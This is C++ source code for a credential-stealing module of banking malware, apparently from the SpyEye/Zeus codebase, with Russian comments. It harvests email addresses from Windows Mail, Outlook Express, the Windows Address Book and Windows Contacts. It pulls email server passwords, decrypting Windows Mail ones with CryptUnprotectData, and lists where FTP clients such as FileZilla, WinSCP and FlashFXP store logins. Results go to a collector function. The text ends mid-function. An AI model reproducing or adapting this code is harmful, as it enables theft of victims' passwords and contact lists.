#include <Windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <security.h>
#pragma region ComIncludes
#  include <wabdefs.h>
#  include <wabapi.h>
#  include <wabtags.h>
#  include <wabiab.h>
#  include <icontact.h>
#  define INITGUID
#  include <guiddef.h>
#  include <imnact.h>
#  include <mimeole.h>
#  include <msoeapi.h>
#  undef INITGUID
#pragma endregion ComIncludes
#include "..\clientdll\defines.h"
#include "core.h"

#include "..\clientdll\osenv.h"
#include "debug.h"

#include "..\common\crypt.h"
#include "..\common\math.h"
#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\comlibrary.h"
#include "..\common\fs.h"
#include "..\common\registry.h"
#include "..\common\xmlparser.h"
#include "..\common\math.h"
#include "..\common\process.h"
#include "..\common\mscab.h"
#include "..\clientdll\spyeye_modules.h"

GATETOCOLLECTOR3 g_GateToCollector3 = NULL;
WRITEDATA g_WriteData = NULL;
CRITICAL_SECTION cs;
DWORD winVersion = NULL;
DWORD flags = NULL;
#if BO_DEBUG > 0
DEBUGWRITESTRING g_Debug=NULL;
#endif

#pragma region AdvancedTextData
typedef struct
{
	DWORD id;
	LPWSTR text;
} Strings;

#define MAX_LEN 60

static Strings strings_table[] = 
{
	{softwaregrabber_flashplayer_path            , L"Macromedia\\Flash Player"},
	{softwaregrabber_flashplayer_archive         , L"flashplayer.cab"},
	{softwaregrabber_flashplayer_mask            , L"*.sol"},

	{softwaregrabber_wab_title                   , L"Windows Address Book"},
	{softwaregrabber_wab_regkey                  , L"SOFTWARE\\Microsoft\\WAB\\DLLPath"},
	{softwaregrabber_wab_wabopen                 , L"WABOpen"},
	{softwaregrabber_wc_title                    , L"Windows Contacts"},
	{softwaregrabber_wc_init_name                , L"A8000A"},
	{softwaregrabber_wc_init_version             , L"1.0"},
	{softwaregrabber_wc_property_format          , L"EmailAddressCollection/EmailAddress[%u]/Address"},
	{softwaregrabber_windows_mail_recips_title   , L"Windows Mail Recipients"},
	{softwaregrabber_outlook_express_recips_title, L"Outlook Express Recipients"},
	{softwaregrabber_outlook_express_title       , L"Outlook Express"},
	{softwaregrabber_windows_mail_file_1         , L"account{*}.oeaccount"},
	{softwaregrabber_windows_mail_regkey         , L"Software\\Microsoft\\Windows Mail"},
	{softwaregrabber_windows_live_mail_regkey    , L"Software\\Microsoft\\Windows Live Mail"},
	{softwaregrabber_windows_mail_regvalue_path  , L"Store Root"},
	{softwaregrabber_windows_mail_regvalue_salt  , L"Salt"},
	{softwaregrabber_windows_mail_to_port        , L"0x%s"},
	{softwaregrabber_windows_mail_title          , L"Windows Mail"},
	{softwaregrabber_windows_live_mail_title     , L"Windows Live Mail"},
	{softwaregrabber_windows_mail_xml_root       , L"MessageAccount"},
	{softwaregrabber_windows_mail_xml_name       , L"Account_Name"},
	{softwaregrabber_windows_mail_xml_email      , L"SMTP_Email_Address"},
	{softwaregrabber_account_title               , L"%sAccount name: %s\nE-mail: %s\n"},
	{softwaregrabber_account_server_info         , L"%s:\n\tServer: %s:%u%s\n\tUsername: %s\n\tPassword: %s\n"},
	{softwaregrabber_account_server_x_server     , L"%s_Server"},
	{softwaregrabber_account_server_x_username   , L"%s_User_Name"},
	{softwaregrabber_account_server_x_password   , L"%s_Password2"},
	{softwaregrabber_account_server_x_port       , L"%s_Port"},
	{softwaregrabber_account_server_x_ssl        , L"%s_Secure_Connection"},
	{softwaregrabber_account_server_smtp         , L"SMTP"},
	{softwaregrabber_account_server_pop3         , L"POP3"},
	{softwaregrabber_account_server_imap         , L"IMAP"},
	{softwaregrabber_account_server_ssl          , L" (SSL)"},

	{softwaregrabber_ftp_report_format1W         , L"ftp://%s:%s@%s:%u\n"},
	{softwaregrabber_ftp_report_format2W         , L"ftp://%s:%s@%s\n"},
	{softwaregrabber_ftp_report_format1A         , L"ftp://%S:%S@%S:%u\n"},
	{softwaregrabber_flashfxp_secret             , L"yA36zA48dEhfrvghGRg57h5UlDv3"},
	{softwaregrabber_flashfxp_file_1             , L"sites.dat"},
	{softwaregrabber_flashfxp_file_2             , L"quick.dat"},
	{softwaregrabber_flashfxp_file_3             , L"history.dat"},
	{softwaregrabber_flashfxp_host               , L"IP"},
	{softwaregrabber_flashfxp_port               , L"port"},
	{softwaregrabber_flashfxp_user               , L"user"},
	{softwaregrabber_flashfxp_pass               , L"pass"},
	{softwaregrabber_flashfxp_regkey             , L"SOFTWARE\\FlashFXP\\3"},
	{softwaregrabber_flashfxp_regvalue           , L"datafolder"},
	{softwaregrabber_flashfxp_path_mask          , L"*flashfxp*"},
	{softwaregrabber_flashfxp_title              , L"FlashFXP"},
	{softwaregrabber_tc_file_1                   , L"wcx_ftp.ini"},
	{softwaregrabber_tc_section_bad_1            , L"connections"},
	{softwaregrabber_tc_section_bad_2            , L"default"},
	{softwaregrabber_tc_host                     , L"host"},
	{softwaregrabber_tc_user                     , L"username"},
	{softwaregrabber_tc_pass                     , L"password"},
	{softwaregrabber_tc_regkey                   , L"SOFTWARE\\Ghisler\\Total Commander"},
	{softwaregrabber_tc_regvalue_ftp             , L"ftpininame"},
	{softwaregrabber_tc_regvalue_dir             , L"installdir"},
	{softwaregrabber_tc_path_mask_1              , L"*totalcmd*"},
	{softwaregrabber_tc_path_mask_2              , L"*total*commander*"},
	{softwaregrabber_tc_path_mask_3              , L"*ghisler*"},
	{softwaregrabber_tc_title                    , L"Total Commander"},
	{softwaregrabber_wsftp_file_1                , L"ws_ftp.ini"},
	{softwaregrabber_wsftp_section_bad_1         , L"_config_"},
	{softwaregrabber_wsftp_host                  , L"HOST"},
	{softwaregrabber_wsftp_port                  , L"PORT"},
	{softwaregrabber_wsftp_user                  , L"UID"},
	{softwaregrabber_wsftp_pass                  , L"PWD"},
	{softwaregrabber_wsftp_regkey                , L"SOFTWARE\\ipswitch\\ws_ftp"},
	{softwaregrabber_wsftp_regvalue              , L"datadir"},
	{softwaregrabber_wsftp_path_mask_1           , L"*ipswitch*"},
	{softwaregrabber_wsftp_title                 , L"WS_FTP"},
	{softwaregrabber_filezilla_file_mask_1       , L"*.xml"},
	{softwaregrabber_filezilla_node_mask         , L"/*/*/Server"},
	{softwaregrabber_filezilla_host              , L"Host"},
	{softwaregrabber_filezilla_port              , L"Port"},
	{softwaregrabber_filezilla_user              , L"User"},
	{softwaregrabber_filezilla_pass              , L"Pass"},
	{softwaregrabber_filezilla_path_mask_1       , L"*filezilla*"},
	{softwaregrabber_filezilla_title             , L"FileZilla"},
	{softwaregrabber_far_regkey_1                , L"SOFTWARE\\Far\\Plugins\\ftp\\hosts"},
	{softwaregrabber_far_regkey_2                , L"SOFTWARE\\Far2\\Plugins\\ftp\\hosts"},
	{softwaregrabber_far_host                    , L"hostname"},
	{softwaregrabber_far_user_1                  , L"username"},
	{softwaregrabber_far_user_2                  , L"user"},
	{softwaregrabber_far_pass                    , L"password"},
	{softwaregrabber_far_title                   , L"FAR manager"},
	{softwaregrabber_winscp_regkey               , L"SOFTWARE\\martin prikryl\\winscp 2\\sessions"},
	{softwaregrabber_winscp_host                 , L"hostname"},
	{softwaregrabber_winscp_port                 , L"portnumber"},
	{softwaregrabber_winscp_user                 , L"username"},
	{softwaregrabber_winscp_pass                 , L"password"},
	{softwaregrabber_winscp_title                , L"WinSCP"},
	{softwaregrabber_fc_file_1                   , L"ftplist.txt"},
	{softwaregrabber_fc_host                     , L";server="},
	{softwaregrabber_fc_port                     , L";port="},
	{softwaregrabber_fc_user                     , L";user="},
	{softwaregrabber_fc_pass                     , L";password="},
	{softwaregrabber_fc_path_mask_1              , L"ftp*commander*"},
	{softwaregrabber_fc_title                    , L"FTP Commander"},
	{softwaregrabber_coreftp_regkey              , L"SOFTWARE\\ftpware\\coreftp\\sites"},
	{softwaregrabber_coreftp_host                , L"host"},
	{softwaregrabber_coreftp_port                , L"port"},
	{softwaregrabber_coreftp_user                , L"user"},
	{softwaregrabber_coreftp_pass                , L"pw"},
	{softwaregrabber_coreftp_title               , L"CoreFTP"},
	{softwaregrabber_smartftp_file_mask_1        , L"*.xml"},
	{softwaregrabber_smartftp_node               , L"FavoriteItem"},
	{softwaregrabber_smartftp_host               , L"Host"},
	{softwaregrabber_smartftp_port               , L"Port"},
	{softwaregrabber_smartftp_user               , L"User"},
	{softwaregrabber_smartftp_pass               , L"Password"},
	{softwaregrabber_smartftp_regkey_1           , L"SOFTWARE\\smartftp\\client 2.0\\settings\\general\\favorites"},
	{softwaregrabber_smartftp_regvalue_1         , L"personal favorites"},
	{softwaregrabber_smartftp_regkey_2           , L"SOFTWARE\\smartftp\\client 2.0\\settings\\backup"},
	{softwaregrabber_smartftp_regvalue_2         , L"folder"},
	{softwaregrabber_smartftp_title              , L"SmartFTP"},
	{softwaregrabber_cuteftp_title               , L"CuteFTP"},
};
#pragma endregion AdvancedTextData

#define _getW(id, buffer) Str::_CopyW(buffer, strings_table[id].text, -1)
#define CSTR_GETA(buffer, id) char buffer[MAX_LEN]; Str::_unicodeToAnsi(strings_table[id].text, -1, buffer, MAX_LEN);
#define CSTR_GETW(buffer, id) WCHAR buffer[MAX_LEN]; Str::_CopyW(buffer, strings_table[id].text, -1);
#define CSTR_EQW(str, id) Str::_CompareW(str, strings_table[id].text, -1, -1) == 0
/*
  Запись отчета.

  IN OUT list   - данные для записи, буду освобождены после выхода из функции.
  IN titleId    - заголовок отчета *.
  IN reportType - BLT_*.
*/
static void writeReport(LPWSTR list, DWORD titleId, DWORD reportType)
{
	WDEBUG("Writing report: type==%u, text=='%s'", reportType, list);
	if(list != NULL && *list != 0)
	{
		WCHAR title[MAX_LEN];
		_getW(titleId, title);
		g_GateToCollector3(reportType, title, list, -1);
	}
	Mem::free(list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
#pragma region GrabbingFunctions
static void getUserNameForPath(LPWSTR buffer)
{
  DWORD size = MAX_PATH;
  if(GetUserNameExW(NameSamCompatible, buffer, &size) != FALSE && size > 0)
  {
    buffer[size] = 0;
    Fs::_replaceSlashes(buffer, '|');
  }
  else
  {
    Str::_CopyW(buffer, L"unknown\\unknown", -1);
  }
}
/*
  Перечесление всех писем из дирикторий Windows Mail.
  
  IN mimeAllocator    - IMimeAllocator.
  IN store            - IStoreNamespace.
  IN currentFolder    - текущая директория.
  IN OUT messageProps - переменная для экономии стека.
  IN OUT folderProps  - переменная для экономии стека.
  IN OUT list         - список для email'ов.
*/
static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, IStoreNamespace *store, IStoreFolder *currentFolder, MESSAGEPROPS *messageProps, FOLDERPROPS *folderProps, LPWSTR *list)
{
	HENUMSTORE enumStore;

	//Ищим сообщения.
	if(currentFolder->GetFirstMessage(MSGPROPS_FAST, 0, MESSAGEID_FIRST, messageProps, &enumStore) == S_OK)
	{
		do
		{
			IMimeMessage *message;
			if(currentFolder->OpenMessage(messageProps->dwMessageId, IID_IMimeMessage, (void **)&message) == S_OK)
			{
				ADDRESSLIST addressList;
				if(message->GetAddressTypes(IAT_RECIPS, IAP_EMAIL, &addressList) == S_OK)
				{
					for(ULONG i = 0; i < addressList.cAdrs; i++)
					{
						//Добавляем адрес.
						LPSTR email = addressList.prgAdr[i].pszEmail;
						if(email != NULL && Str::_findCharA(email, '@') != NULL)
						{
							LPWSTR emailW = Str::_ansiToUnicodeEx(email, -1);
							if(emailW != NULL && Str::_CatExW(list, emailW, -1))
								Str::_CatExW(list, L"\n", 1);
							Mem::free(emailW);
						}
					}
					mimeAllocator->FreeAddressList(&addressList);
				}
				message->Release();
			}
			currentFolder->FreeMessageProps(messageProps);
		}
		while(currentFolder->GetNextMessage(enumStore, MSGPROPS_FAST, messageProps) == S_OK);
		currentFolder->GetMessageClose(enumStore);
	}

	//Ищим подиректории.
	if(currentFolder->GetFolderProps(0, folderProps) == S_OK && folderProps->cSubFolders > 0 && store->GetFirstSubFolder(folderProps->dwFolderId, folderProps, &enumStore) == S_OK)
	{
		IStoreFolder *subFolder;
		do if(store->OpenFolder(folderProps->dwFolderId, 0, &subFolder) == S_OK)
		{
			WDEBUG("folderProps->szName=[%S].", folderProps->szName);
			enumWindowsMailMessagesAndFolders(mimeAllocator, store, subFolder, messageProps, folderProps, list);
			subFolder->Release();
		}
		while(store->GetNextSubFolder(enumStore, folderProps) == S_OK);    
		store->GetSubFolderClose(enumStore);    
	}
}

void _emailWindowsMailRecipients(void)
{
	IStoreNamespace *store = (IStoreNamespace *)ComLibrary::_createInterface(CLSID_StoreNamespace, IID_IStoreNamespace);
	if(store == NULL)return;

	LPWSTR list = NULL;
	IStoreFolder *sendFolder;

	//Получаем "Sent items".
	if(store->Initialize(NULL, 0) == S_OK && store->OpenSpecialFolder(FOLDER_SENT, 0, &sendFolder) == S_OK)
	{
		IMimeAllocator *mimeAllocator = (IMimeAllocator *)ComLibrary::_createInterface(CLSID_IMimeAllocator, IID_IMimeAllocator);    
		if(mimeAllocator != NULL)
		{
			FOLDERPROPS folderProps;
			MESSAGEPROPS messageProps;

			messageProps.cbSize = sizeof(MESSAGEPROPS);
			folderProps.cbSize  = sizeof(FOLDERPROPS);

			enumWindowsMailMessagesAndFolders(mimeAllocator, store, sendFolder, &messageProps, &folderProps, &list);

			mimeAllocator->Release();
		}
		sendFolder->Release();  
	}

	//Выход.
	store->Release();

	//Сохраянем лог.          
	DWORD titleId = winVersion < OsEnv::VERSION_VISTA ? softwaregrabber_outlook_express_recips_title : softwaregrabber_windows_mail_recips_title;
	writeReport(list, titleId, BLT_GRABBED_EMAILSOFTWARE);
}

////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Надстройка над IPropertyContainer::GetPropSz() для получения Unicode-строки.

  IN account - аккаунт.
  IN id      - ID опции.

  Return     - строка, или NULL. Нужно освободить через Mem.
*/
static LPWSTR outlookExpressSzToUnicode(IImnAccount *account, DWORD id)
{
	char buffer[256/*Макс. размер согласно CCHMAX_*.*/];
	if(account->GetPropSz(id, buffer, sizeof(buffer)) != S_OK)
		return NULL;
	return Str::_ansiToUnicodeEx(buffer, -1);
}

/*
  Добавление данных сервера в отчет.

  IN title      - заголовок.
  IN account    - аккаунт.
  IN serverId   - AP_*_SERVER.
  IN portId     - AP_*_PORT.
  IN sslId      - AP_*_SSL.
  IN userNameId - AP_*_USERNAME.
  IN passwordId - AP_*_PASSWORD.
  OUT buffer    - буфер для данных.
*/
static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, DWORD serverId, DWORD portId, DWORD sslId, DWORD userNameId, DWORD passwordId, LPWSTR *buffer)
{
	//Получаем.
	LPWSTR server   = outlookExpressSzToUnicode(account, serverId);
	LPWSTR userName = outlookExpressSzToUnicode(account, userNameId);
	LPWSTR password = outlookExpressSzToUnicode(account, passwordId);

	DWORD ssl;
	DWORD port;
	if(account->GetPropDw(portId, &port) != S_OK) port = 0;
	if(account->GetPropDw(sslId,  &ssl)  != S_OK) ssl  = 0;

	//Добавляем.
	{
		CSTR_GETW(format, softwaregrabber_account_server_info);
		CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);

		Str::_sprintfCatExW(buffer, Str::_LengthW(*buffer), format,
			title,
			server == NULL ? L"" : server,
			port,
			ssl == 0 ? L"" : sslMarker,
			userName == NULL ? L"" : userName,
			password == NULL ? L"" : password
			);
	}

	//Освобождаем.
	Mem::free(server);
	Mem::free(userName);
	Mem::free(password);
}

void _emailOutlookExpress(void)
{
	HRESULT hr;

	//Получаем IImnAccountManager.
	IImnAccountManager *manager = (IImnAccountManager *)ComLibrary::_createInterface(CLSID_ImnAccountManager, IID_IImnAccountManager);
	if(manager == NULL)return;

	//Инициализация.
	IImnEnumAccounts *accounts;
	LPWSTR list = NULL;

	if(manager->InitEx(NULL, ACCT_INIT_ATHENA) == S_OK && manager->Enumerate(SRV_SMTP | SRV_POP3 | SRV_IMAP, &accounts) == S_OK)
	{
		IImnAccount *account;
		while(accounts->GetNext(&account) == S_OK)
		{
			DWORD serverTypes;
			if(account->GetServerTypes(&serverTypes) == S_OK && serverTypes != 0)
			{
				//Заголовок аккаунта.
				{
					LPWSTR accountName = outlookExpressSzToUnicode(account, AP_ACCOUNT_NAME);
					LPWSTR email       = outlookExpressSzToUnicode(account, AP_SMTP_EMAIL_ADDRESS);

					CSTR_GETW(format, softwaregrabber_account_title);
					DWORD size = Str::_sprintfCatExW(&list, Str::_LengthW(list), format,
						(list == NULL || *list == 0) ? L"" : L"\n",
						accountName == NULL ? L"" : accountName,
						email == NULL ? L"" : email
						); 

					Mem::free(accountName);
					Mem::free(email);

					if(size == (DWORD)-1)serverTypes = 0;
				}

				if(serverTypes & SRV_IMAP)
				{
					CSTR_GETW(title, softwaregrabber_account_server_imap);
					appendOutlookExpressInfo(title, account, AP_IMAP_SERVER, AP_IMAP_PORT, AP_IMAP_SSL, AP_IMAP_USERNAME, AP_IMAP_PASSWORD, &list);
				}

				if(serverTypes & SRV_POP3)
				{
					CSTR_GETW(title, softwaregrabber_account_server_pop3);
					appendOutlookExpressInfo(title, account, AP_POP3_SERVER, AP_POP3_PORT, AP_POP3_SSL, AP_POP3_USERNAME, AP_POP3_PASSWORD, &list);
				}

				if(serverTypes & SRV_SMTP)
				{
					CSTR_GETW(title, softwaregrabber_account_server_smtp);
					appendOutlookExpressInfo(title, account, AP_SMTP_SERVER, AP_SMTP_PORT, AP_SMTP_SSL, AP_SMTP_USERNAME, AP_SMTP_PASSWORD, &list);
				}
			}
			account->Release();
		}
		accounts->Release();
	}
	manager->Release();
	writeReport(list, softwaregrabber_outlook_express_title, BLT_GRABBED_EMAILSOFTWARE);
}

////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
	LPWSTR list;    //Строка для вывода аккаунтов.
	DATA_BLOB salt; //Секрет паролей.
}WINDOWSMAILDATA;

/*
  Получение строки из Windows Mail параметра.

  IN root     - рутовый элемент.
  IN title    - заголовок(префкс) элемента.
  IN stringId - ID строки формата элемента.

  Return      - строка, или NULL в случаи ошибки. Нужно освободить через _freeBstr().
*/
static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD stringId)
{
	WCHAR name[40]; //Размер на softwaregrabber_account_server_x_*.
	WCHAR format[30]; //Размер на softwaregrabber_account_server_x_*.

	_getW(stringId, format);
	if(Str::_sprintfW(name, sizeof(name) / sizeof(WCHAR), format, title) > 0)
		return XmlParser::_getNodeTextOfElement(root, name);
	return NULL;
}

/*
  Добавление данных сервера в отчет.

  IN title   - заголовок.
  IN defaultPort - порт по умолчанию.
  IN salt        - секрет пароля.
  IN root        - рутовый элемент.
  OUT buffer     - буфер для данных.

  Return         - true - данные добавлены,
                   false - данные не найдены.
*/
static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const DATA_BLOB *salt, IXMLDOMElement *root, LPWSTR *buffer)
{
	//Получаем.
	BSTR server   = getWindowsMailString(root, title, softwaregrabber_account_server_x_server);
	BSTR port     = getWindowsMailString(root, title, softwaregrabber_account_server_x_port);
	BSTR ssl      = getWindowsMailString(root, title, softwaregrabber_account_server_x_ssl);
	BSTR userName = getWindowsMailString(root, title, softwaregrabber_account_server_x_username);
	BSTR password = getWindowsMailString(root, title, softwaregrabber_account_server_x_password);

	//Добавляем.
	bool ok = (server != NULL);
	if(ok)
	{
		DWORD portDword     = 0;
		DWORD sslDword      = ssl == NULL ? 0 : Str::_ToInt32W(ssl, NULL);
		LPWSTR passwordReal = NULL;

		//Убейте меня за говнокод.
		if(port != NULL)
		{
			WCHAR portEx[12];
			CSTR_GETW(format, softwaregrabber_windows_mail_to_port);
			Str::_sprintfW(portEx, sizeof(portEx) / sizeof(WCHAR), format, port);
			portDword = Str::_ToInt32W(portEx, NULL);
		}

		//Получаем пароль.
		int passwordLen = Str::_LengthW(password);
		if(password != NULL && passwordLen > 1 && (passwordLen % 2) == 0)
		{
			DATA_BLOB source;
			DATA_BLOB dest;

			source.cbData = passwordLen / 2;
			if((source.pbData = (BYTE *)Mem::alloc(source.cbData)) != NULL)
			{
				if(Str::_fromHexW(password, source.pbData) && CWA(crypt32, CryptUnprotectData)(&source, NULL, (DATA_BLOB *)salt, NULL, NULL, 0, &dest) == TRUE)
				{
					passwordReal = Str::_CopyExW((LPWSTR)dest.pbData, dest.cbData);        
					CWA(kernel32, LocalFree)(dest.pbData);
				}
				Mem::free(source.pbData);
			}
		}

		//Выводим.
		CSTR_GETW(format, softwaregrabber_account_server_info);
		CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);

		Str::_sprintfCatExW(buffer, Str::_LengthW(*buffer), format,
			title,
			/*server == NULL ? L"" : */server,
			portDword,
			sslDword     == 0    ? L"" : sslMarker,
			userName     == NULL ? L"" : userName,
			passwordReal == NULL ? L"" : passwordReal
			);
		Mem::free(passwordReal);
	}

	//Освобождаем.
	XmlParser::_freeBstr(server);
	XmlParser::_freeBstr(port);
	XmlParser::_freeBstr(ssl);
	XmlParser::_freeBstr(userName);
	XmlParser::_freeBstr(password);

	return ok;
}

/*
  Обработка XML-файла с аккаунтом Winodws Mail.
*/
static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	WCHAR fileName[MAX_PATH];
	WINDOWSMAILDATA *wmd = (WINDOWSMAILDATA *)data;
	IXMLDOMDocument *doc;

	//Открываем файл.
	if(!Fs::_pathCombine(fileName, path, (LPWSTR)fileInfo->cFileName) || (doc = XmlParser::_openFile(fileName, NULL)) == NULL)
		return true;

	//Пробираемся к списку акканутов.
	IXMLDOMElement *root;
	if(doc->get_documentElement(&root) == S_OK)
	{
		//Проверяем имя рута.
		bool ok = false;
		{
			BSTR rootName;
			if(root->get_nodeName(&rootName) == S_OK)
			{
				ok = CSTR_EQW(rootName, softwaregrabber_windows_mail_xml_root);
				XmlParser::_freeBstr(rootName);
			}
		}

		//Получаем аккауны.
		if(ok)
		{        
			LPWSTR tmpList = NULL;

			//Заголовок аккаунта.
			{
				BSTR accountName;
				BSTR email;

				{
					CSTR_GETW(node, softwaregrabber_windows_mail_xml_name);
					accountName = XmlParser::_getNodeTextOfElement(root, node);
				}

				{
					CSTR_GETW(node, softwaregrabber_windows_mail_xml_email);
					email = XmlParser::_getNodeTextOfElement(root, node);
				}

				CSTR_GETW(format, softwaregrabber_account_title);
				int size = Str::_sprintfExW(&tmpList, format,
					(wmd->list == NULL || wmd->list[0] == 0) ? L"" : L"\n",
					accountName == NULL ? L"" : accountName,
					email       == NULL ? L"" : email
					); 

				XmlParser::_freeBstr(accountName);
				XmlParser::_freeBstr(email);

				if(size <= 0)ok = false;
			}

			//Данные.
			if(ok)
			{
				BYTE appended = 0;

				{
					CSTR_GETW(title, softwaregrabber_account_server_imap);
					if(appendWindowsMailInfo(title, 0x8F, &wmd->salt, root, &tmpList)) appended++;
				}

				{
					CSTR_GETW(title, softwaregrabber_account_server_pop3);
					if(appendWindowsMailInfo(title, 0x6E, &wmd->salt, root, &tmpList)) appended++;
				}

				{
					CSTR_GETW(title, softwaregrabber_account_server_smtp);
					if(appendWindowsMailInfo(title, 0x19, &wmd->salt, root, &tmpList)) appended++;
				}

				if(appended > 0)
					Str::_CatExW(&wmd->list, tmpList, -1);
				Mem::free(tmpList);
			}
		}
		root->Release();
	}
	XmlParser::_closeFile(doc);

	return true;
}

void _emailWindowsMail(bool live)
{
	WINDOWSMAILDATA wmd;
	WCHAR path[MAX_PATH];
	{
		//Получаем ключ.
		WCHAR regKey[MAX_LEN];
		_getW(live ? softwaregrabber_windows_live_mail_regkey : softwaregrabber_windows_mail_regkey, regKey);

		//Получаем директорию для поиска.
		{  
			CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_path);
			DWORD r = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, path, MAX_PATH);
			if(r == 0 || r == (DWORD)-1)
				return;
			WDEBUG("path=[%s]", path);
		}

		//Получаем секрет для пароля.
		wmd.list = NULL;
		{
			CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_salt);
			if((wmd.salt.cbData = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, regKey, regValue, NULL, (void **)&wmd.salt.pbData)) == (DWORD)-1)
				Mem::_zero(&wmd.salt, sizeof(wmd.salt));
		}
	}

	//Ищим.
	{
		CSTR_GETW(file1, softwaregrabber_windows_mail_file_1);
		LPWSTR files[] = {file1};
		Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_RECURSIVE | Fs::FFFLAG_SEARCH_FILES, windowsMailAccountProc, &wmd, NULL, 0, 0);
	}

	//Сохраянем лог.          
	writeReport(wmd.list, live ? softwaregrabber_windows_live_mail_title : softwaregrabber_windows_mail_title, BLT_GRABBED_EMAILSOFTWARE);
}

void _emailWindowsAddressBook(void)
{
	//Загружаем DLL.
	HMODULE wabDll;
	{
		WCHAR dllPath[MAX_PATH];
		CSTR_GETW(regKey, softwaregrabber_wab_regkey);
		
		DWORD size = Registry::_getValueAsString(HKEY_LOCAL_MACHINE, regKey, NULL, dllPath, MAX_PATH);

		if(size == (DWORD)-1 || size == 0)
		{
			WDEBUG("Path of wab not founded.");
			return;
		}

		if((wabDll = CWA(kernel32, LoadLibraryW)(dllPath)) == NULL)
		{
			WDEBUG("Failed to load [%s].", dllPath);
			return;
		}
	}

	//Получаем интерфейс.
	IAddrBook *addressBook;
	IWABObject *wabObject;
	{
		CSTR_GETA(funcName, softwaregrabber_wab_wabopen);
		LPWABOPEN wabOpen = (LPWABOPEN)CWA(kernel32, GetProcAddress)(wabDll, funcName);
		if(wabOpen == NULL || wabOpen(&addressBook, &wabObject, NULL, 0) != S_OK)
		{
			WDEBUG("%s failed.", funcName);
			goto END;
		}
	}

	//Собираем emails.
	ULONG entryId;
	ENTRYID *entryIdStruct;
	ULONG objectType;
	IUnknown *unknown;  
	LPWSTR list = NULL;
	HRESULT freeResult;

	if(addressBook->GetPAB(&entryId, &entryIdStruct) == S_OK)
	{
		if(addressBook->OpenEntry(entryId, entryIdStruct, NULL, MAPI_BEST_ACCESS, &objectType, &unknown) == S_OK)
		{
			if(objectType == MAPI_ABCONT)
			{
				IMAPITable *table;
				IABContainer *abContainer = (IABContainer *)unknown;

				if(abContainer->GetContentsTable(WAB_PROFILE_CONTENTS, &table) == S_OK)
				{
					ULONG rowsCount;
					SRowSet *rows;

					if(table->GetRowCount(0, &rowsCount) == S_OK && table->QueryRows(rowsCount, 0, &rows) == S_OK)
					{
						//Перечисляем.
						for(ULONG i = 0; i < rows->cRows; i++)
						{
							SRow *row = &rows->aRow[i];

							for(ULONG j = 0; j < row->cValues; j++)
							{
								SPropValue *props = &row->lpProps[j];
								bool ok = false;
								switch(props->ulPropTag)
								{                
									case PR_EMAIL_ADDRESS_W:
										if(Str::_findCharW(props->Value.lpszW, '@') != NULL)
										{
											ok = Str::_CatExW(&list, props->Value.lpszW, -1);
										}
										break;

									case PR_EMAIL_ADDRESS_A:
										if(Str::_findCharA(props->Value.lpszA, '@') != NULL)
										{
											LPWSTR tmpBuffer = Str::_ansiToUnicodeEx(props->Value.lpszA, -1);
											if(tmpBuffer)ok = Str::_CatExW(&list, tmpBuffer, -1);
											Mem::free(tmpBuffer);
										}
										break;

									default:
										WDEBUG("props->ulPropTag=0x%08X", props->ulPropTag);
										break;
								}
								if(ok)Str::_CatExW(&list, L"\n", 1);
							}
							freeResult = wabObject->FreeBuffer(row->lpProps);
							WDEBUG("freeResult=0x%08X", freeResult);
						}
						freeResult = wabObject->FreeBuffer(rows);
						WDEBUG("freeResult=0x%08X", freeResult);
					}
					table->Release();
				}
			}
			unknown->Release();
		}
		freeResult = wabObject->FreeBuffer(entryIdStruct);
		WDEBUG("freeResult=0x%08X", freeResult);
	}
#if(BO_DEBUG > 0)
	else ;WDEBUG("Failed.");
#endif  

	//Выход.
	addressBook->Release();
	wabObject->Release();

	//Сохраянем лог.
	writeReport(list, softwaregrabber_wab_title, BLT_GRABBED_EMAILSOFTWARE);

END:  
	CWA(kernel32, FreeLibrary)(wabDll);
}

void _emailWindowsContacts(void)
{
	HRESULT hr;

	//Получаем IContactManager.
	IContactManager *manager = (IContactManager *)ComLibrary::_createInterface(CLSID_ContactManager, IID_IContactManager);
	if(manager == NULL) return;

	//Инициализация.  
	{
		CSTR_GETW(initName, softwaregrabber_wc_init_name);
		CSTR_GETW(initVersion, softwaregrabber_wc_init_version);
		hr = manager->Initialize(initName, initVersion);
	}

	//Получаем все контакты.
	IContactCollection *collection;
	LPWSTR list = NULL;

	if(hr == S_OK && manager->GetContactCollection(&collection) == S_OK)
	{
		CSTR_GETW(propertyFormat, softwaregrabber_wc_property_format);
		WCHAR propertyName[sizeof(propertyFormat) / sizeof(WCHAR) + 4];
		WCHAR email[100];

		IContact *contact;
		IContactProperties *props;

		collection->Reset(); //Параноя.
		while(collection->Next() == S_OK) if(collection->GetCurrent(&contact) == S_OK)
		{
			if(contact->QueryInterface(IID_IContactProperties, (void **)&props) == S_OK)
			{
				for(BYTE i = 1; i <= 100; i++) //Т.е. не более 100 мылов на конакт.
				{
					if(Str::_sprintfW(propertyName, sizeof(propertyName) / sizeof(WCHAR), propertyFormat, i) <= 0)
						break;

					DWORD size = sizeof(email) / sizeof(WCHAR);
					hr = props->GetString(propertyName, CGD_DEFAULT, email, size, &size);

					if(hr == S_OK && Str::_findCharW(email, '@') != NULL && Str::_CatExW(&list, email, -1))
						Str::_CatExW(&list, L"\n", 1);

					WDEBUG("hr=0x%08X", hr);

					if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Буфер мал.*/ || hr == S_FALSE /*Параметр пустой*/)
						continue;

					break; //Обычно ERROR_PATH_NOT_FOUND.
				}
				props->Release();
			} 
			contact->Release();
		}
		collection->Release();
	}
	manager->Release();
